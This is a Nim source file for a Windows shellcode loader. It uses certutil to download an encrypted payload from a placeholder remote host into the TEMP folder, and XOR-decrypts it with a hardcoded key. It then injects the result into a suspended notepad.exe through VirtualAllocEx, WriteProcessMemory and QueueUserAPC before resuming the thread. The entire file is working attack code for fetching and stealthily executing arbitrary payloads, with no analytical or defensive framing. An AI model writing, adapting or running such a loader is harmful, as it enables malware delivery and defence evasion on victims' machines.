import winim/lean
import os, osproc


proc injectQueueUserAPC[I, T](shellcode: array[I, T]): void =
    var
        si: STARTUPINFOEX
        pi: PROCESS_INFORMATION
        ps, ts: SECURITY_ATTRIBUTES
        res: WINBOOL
        pHandle, tHandle: HANDLE

    si.StartupInfo.cb = sizeof(si).cint
    ps.nLength = sizeof(ps).cint
    ts.nLength = sizeof(ts).cint

    let applicationName = newWideCString(r"C:\Windows\notepad.exe")

    res = CreateProcess(
        NULL,
        applicationName,
        addr ps,
        addr ts,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT or CREATE_SUSPENDED,
        NULL,
        NULL,
        addr si.StartupInfo,
        addr pi
    )

    pHandle = pi.hProcess
    tHandle = pi.hThread

    let baseAddr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_READWRITE
    )

    var bytesWritten: SIZE_T

    let wSuccess = WriteProcessMemory(
        pHandle,
        baseAddr,
        unsafeAddr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )

    var prevPro: DWORD = 0
    var virPro = VirtualProtectEx(
        pHandle,
        baseAddr,
        cast[SIZE_T](shellcode.len),
        PAGE_EXECUTE_READ,
        addr prevPro
    )

    var success: DWORD = 0

    success = QueueUserAPC(cast[PAPCFUNC](baseAddr), tHandle, 0)
    success = ResumeThread(tHandle)

    CloseHandle(tHandle)
    CloseHandle(pHandle)
    WaitForSingleObject(pi.hProcess, INFINITE)


proc downloadFile(url: string, destination: string) =
  let tempDir = joinPath(getEnv("TEMP"), "NimDownloader") 
  createDir(tempDir)

  let fullPath = joinPath(tempDir, destination)
  
  let command = "certutil -urlcache -split -f " & url & " " & fullPath
  let result = execCmd(command)


let fileName = "encrypted_shellcode.bin"
let tempDir = joinPath(getEnv("TEMP"), "NimDownloader")
let fullPath = joinPath(tempDir, fileName)
let url = "http://ip/encrypted_shellcode.bin"
downloadFile(url, fileName)

proc charSeqToByteSeq(chars: seq[char]): seq[byte] =
  result = @[]
  for c in chars:
    result.add(cast[byte](ord(c)))

proc xorEncryptDecrypt(data: seq[byte], key: seq[byte]): seq[byte] =
  result = @[]
  var keyIndex = 0
  for b in data:
    result.add(b xor key[keyIndex])
    inc(keyIndex)
    if keyIndex == key.len:
      keyIndex = 0

proc decodeShellcode(filePath: string, key: seq[byte]): seq[byte] =
  let encryptedShellcode = readFile(filePath)
  xorEncryptDecrypt(cast[seq[byte]](encryptedShellcode), key)

let encryptionKeyChars: seq[char] = @['w', 'q', 'e', 'w', 'q', 't', 'f', 'a', '1', '2', '3', '1', '5', 'r', '1']
let encryptionKey: seq[byte] = charSeqToByteSeq(encryptionKeyChars)  # key "wqewqtfa12315r1"
let decryptedShellcode = decodeShellcode(fullPath, encryptionKey)

when defined(windows):
  var shellcode: array[511, byte]
  for i, byteVal in decryptedShellcode.pairs:
    shellcode[i] = byteVal

when isMainModule:
  injectQueueUserAPC(shellcode)
